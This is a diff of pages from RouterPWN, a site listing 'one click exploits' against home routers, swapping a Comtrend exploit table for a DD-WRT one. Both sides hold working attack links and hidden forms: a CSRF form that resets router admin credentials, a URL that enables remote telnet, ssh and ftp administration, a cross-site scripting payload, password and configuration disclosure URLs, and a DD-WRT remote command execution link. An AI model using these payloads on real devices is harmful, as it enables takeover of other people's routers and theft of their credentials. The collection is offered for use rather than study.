@@ -2,7 +2,7 @@
 <html>
  <head>
   <title>
-   RouterPWN - Comtrend - One click exploits, News, Vulnerabilities, POC, Alerts
+   RouterPWN - DD-WRT - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
   <link href="includes/images/favicon.ico" rel="shortcut icon"/>
@@ -76,9 +76,9 @@
     </tr>
     <tr>
      <td>
-      <section id="comtrend">
+      <section id="DD-WRT">
        <h1>
-        Comtrend
+        DD-WRT
        </h1>
        <table cellspacing="0" class="display" id="tabla" width="100%">
         <thead>
@@ -120,200 +120,65 @@
          </tr>
         </tfoot>
         <tbody>
-         <form action="http://192.168.1.1/password.cgi" id="comtrendpass" method="post" name="comtrendpass">
-          <input name="sptPassword" type="hidden"/>
-          <input name="usrPassword" type="hidden"/>
-          <input name="sysPassword" type="hidden"/>
+         <tr>
+          <td>
+           12/27/10
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.devttys0.com/2010/12/dd-wrt-i-know-where-you-live/">
+            www.devttys0.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/Info.live.htm">
+            DD-WRT information disclosure
+           </a>
+           <a href="javascript:setip('/Info.live.htm')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           07/20/09
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.securityfocus.com/bid/35742/info">
+            www.securityfocus.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:ddwrtexec()">
+            DD-WRT remote comand execution
+           </a>
+           <a href="javascript:ddwrtexecr()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <form action="http://192.168.1.1/cgi-bin/webcm" enctype="application/x-www-form-urlencoded" id="dsltpass" method="post" name="dsltpass">
+          <input name="getpage" type="hidden" value="../html/tools/usrmgmt.htm"/>
+          <input name="security:settings/username" type="hidden" value="admin"/>
+          <input name="security:settings/password" type="hidden" value="password"/>
+          <input name="security:settings/password_confirm" type="hidden" value="password"/>
+          <input name="security:settings/idle_timeout" type="hidden" value="30"/>
          </form>
-         <tr>
-          <td>
-           01/08/12
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="javascript:alert('Busindre')">
-            [+]
-           </a>
-          </td>
-          <td>
-           <a href="javascript:comtrendip()">
-            CT-53XX CT-5071 CT-56XX Put a local IP in DMZ
-           </a>
-           <a href="javascript:ncomtrendipr()">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           01/08/12
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="javascript:alert('Busindre')">
-            [+]
-           </a>
-          </td>
-          <td>
-           <a href="http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3">
-            CT-53XX CT-5071 CT-56XX Enable remote admin
-           </a>
-           <a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3')">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           11/09/11
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://www.exploit-db.com/exploits/18101/">
-            www.exploit-db.com
-           </a>
-          </td>
-          <td>
-           <a href="javascript:ncomtrendpass()">
-            CT-5624 Change passwords
-           </a>
-           <a href="javascript:ncomtrendpassr()">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           03/04/11
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://www.exploit-db.com/exploits/16275/">
-            www.exploit-db.com
-           </a>
-          </td>
-          <td>
-           <a href="javascript:comtrendpass()">
-            CT-5367 Change passwords
-           </a>
-           <a href="javascript:comtrendpassr()">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           03/04/11
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://www.exploit-db.com/exploits/16275/">
-            www.exploit-db.com
-           </a>
-          </td>
-          <td>
-           <a href="http://192.168.1.1/password.cgi">
-            CT-5367 CT-5624 Information Disclosure
-           </a>
-           <a href="javascript:setip('/password.cgi')">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           01/23/10
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://foro.undersecurity.net/read.php?16,6320">
-            foro.undersecurity.net
-           </a>
-          </td>
-          <td>
-           <a href="javascript:urlxss('http://192.168.1.1/scvrtsrv.cmd?action=add&amp;srvName=URLXSS&amp;srvAddr=192.168.1.1&amp;proto=1,&amp;eStart=1,&amp;eEnd=1,&amp;iStart=1,&amp;iEnd=1');">
-            CT-507IT Cross site scripting
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           03/04/08
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://seclists.org/bugtraq/2008/Dec/226">
-            seclists.org
-           </a>
-          </td>
-          <td>
-           <a href="http://192.168.0.1/password.html">
-            CT-536 HG-536+ Information Disclosure
-           </a>
-           <a href="javascript:setip('/password.html')">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           03/04/08
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://archives.neohapsis.com/archives/bugtraq/2008-12/0227.html">
-            archives.neohapsis.com
-           </a>
-          </td>
-          <td>
-           <a href="http://192.168.0.1/backupsettings.html">
-            CT-536 HG-536+ Configuration Disclosure
-           </a>
-           <a href="javascript:setip('/backupsettings.html')">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
+         <form action="#" id="dsl2640" method="post" name="dsl2640">
+         </form>
+         <form action="http://192.168.1.1/wizisp.cgi?quick=1&amp;sntpRefresh=0&amp;wizTmpSntpEnable=0&amp;wizTmpDST=0" id="f2640U" method="post" name="f2640U">
+         </form>
         </tbody>
        </table>
       </section>
